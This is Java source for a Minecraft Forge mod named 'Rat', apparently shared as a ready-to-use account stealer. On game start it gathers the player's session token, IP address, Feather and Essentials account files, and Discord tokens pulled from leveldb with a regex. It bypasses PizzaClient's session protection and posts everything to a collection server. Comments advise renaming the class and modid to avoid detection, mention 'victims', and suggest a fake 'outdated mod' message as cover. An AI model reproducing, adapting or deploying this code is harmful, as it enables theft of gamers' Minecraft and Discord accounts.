package studio.dreamys;

import net.minecraft.client.Minecraft;
import net.minecraft.util.ChatComponentText;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import org.apache.commons.lang3.StringEscapeUtils;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Mod(modid = "") //change this because hypixel doesn't like empty modids
public class Rat { //change class name please for the love of god

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);

        //do everything on separate thread to avoid freezing
        new Thread(() -> {
            try {
                //setup connection
                HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-type", "application/json");
                c.setDoOutput(true);

                Minecraft mc = Minecraft.getMinecraft();
                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                String token = mc.getSession().getToken();
                String feather = "File not found :(", essentials = "File not found :(", discord = "Discord not found :(";
                
                //"if u swap these files with yours, you get infinite access to victims accounts"      -Shlost#5052
                if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
                    feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
                }

                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json"))) {
                    essentials = Files.readAllLines(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json")).toString();
                }

                //discord tokens
                if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb"))) {
                    discord = "";
                    for (File file : Objects.requireNonNull(Paths.get(mc.mcDataDir.getParent(), "discord/Local Storage/leveldb").toFile().listFiles())) {
                        if (file.getName().endsWith(".ldb")) {
                            FileReader fr = new FileReader(file);
                            BufferedReader br = new BufferedReader(fr);
                            String textFile;
                            StringBuilder parsed = new StringBuilder();

                            while ((textFile = br.readLine()) != null) parsed.append(textFile);

                            //release resources
                            fr.close();
                            br.close();

                            Pattern pattern = Pattern.compile("[a-zA-Z\\d]{24}\\.[a-zA-Z\\d]{6}\\.[a-zA-Z\\d_\\-]{27}|mfa\\.[a-zA-Z\\d_\\-]{84}");
                            Matcher matcher = pattern.matcher(parsed.toString());

                            if (matcher.find()) {
                                discord += matcher.group() + "\\n";
                            }
                        }
                    }
                }

                //pizzaclient bypass
                if (Loader.isModLoaded("pizzaclient")) {
                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                }

                //send req
                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\", \"feather\": \"%s\", \"essentials\": \"%s\", \"discord\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip, StringEscapeUtils.escapeJson(feather), StringEscapeUtils.escapeJson(essentials), discord);
                OutputStream os = c.getOutputStream();
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);

                //receive res
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String responseLine;

                while ((responseLine = br.readLine()) != null) response.append(responseLine.trim());
                System.out.println(response);

                //release resources
                os.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @SubscribeEvent
    public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
        //send and unregister when player joins
        if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
            //do something here (ex: play the "outdated mod" card)
//            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
            MinecraftForge.EVENT_BUS.unregister(this);
        }
    }
}